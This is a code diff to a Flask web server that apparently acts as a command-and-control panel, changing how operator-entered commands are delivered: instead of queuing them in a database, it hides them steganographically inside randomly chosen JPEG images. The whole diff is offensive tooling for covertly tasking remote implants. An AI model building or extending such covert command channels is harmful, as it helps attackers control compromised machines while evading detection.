@@ -6,6 +6,8 @@ from flask import Flask, render_template, request, url_for, redirect
 import flask_login
 import base64
 import os
+from stegotest import *
+import random
 
 app = Flask(__name__)
 
@@ -120,7 +122,7 @@ def request_loader(request):
 def home():
     get_commands = Command.query.all()
     if len(Results.query.all()) == 0:
-        return render_template('index.html', returns=' \n ', commands=get_commands, name=flask_login.current_user.id)
+        return render_template('index.html', returns=' \n ', name=flask_login.current_user.id)
     else:
         get_returns = Results.query.order_by(desc(Results.id))
         if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
@@ -199,9 +201,23 @@ def getCommand():
 @app.route('/create-task', methods=['POST'])
 @flask_login.login_required
 def create():
-    new_task = Command(cmd=request.form['content'], done=False)
-    db.session.add(new_task)
-    db.session.commit()
+    cmd, cmd2, cmd3 = "", "", ""
+
+    if request.form['content'] != None:
+        cmd = request.form['content']
+    # if request.form['content2'] != None:
+    #     cmd2 = request.form['content2']
+    # if request.form['content3'] != None:
+    #     cmd3 = request.form['content3']
+
+    cmds = [cmd, cmd2, cmd3]
+    pic_num = random.randint(1, 5)
+    img = "images/diniFall" + str(pic_num) + ".jpg"
+
+    encodeImage(cmds, img, 1)
+    # new_task = Command(cmd=request.form['content'], done=False)
+    # db.session.add(new_task)
+    # db.session.commit()
     return redirect(url_for('home'))
 
 
@@ -273,7 +289,7 @@ def unauthorized_handler():
 if __name__ == '__main__':
     main()
     app.run(host="0.0.0.0", debug=False)
-    db.create_all()
+    # db.create_all()
 
 
 # DEPRECATED CODE
